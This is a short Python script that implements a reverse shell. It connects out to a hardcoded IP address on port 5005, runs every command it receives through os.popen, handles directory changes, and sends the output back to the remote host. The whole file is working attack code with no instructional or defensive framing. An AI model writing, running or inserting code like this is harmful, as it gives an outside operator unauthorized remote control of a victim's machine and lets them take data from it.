#!/usr/bin/env python

import socket, os


TCP_IP = '18.205.162.48'
TCP_PORT = 5005
BUFFER_SIZE = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(os.popen("pwd").read() + ">>>")

while True:
	data = s.recv(BUFFER_SIZE)
	if not data: break
	print(data)

	try:
		if data[:2] == 'cd':
			os.chdir(data.split(' ')[1])
			s.send(os.popen("pwd").read() + ">>>")
		else:
			ret = os.popen(data).read()
			print(ret)
			s.send(ret + ">>>")
	except Exception:
		s.send("Error")
		pass


# print "received data:", data
s.close()

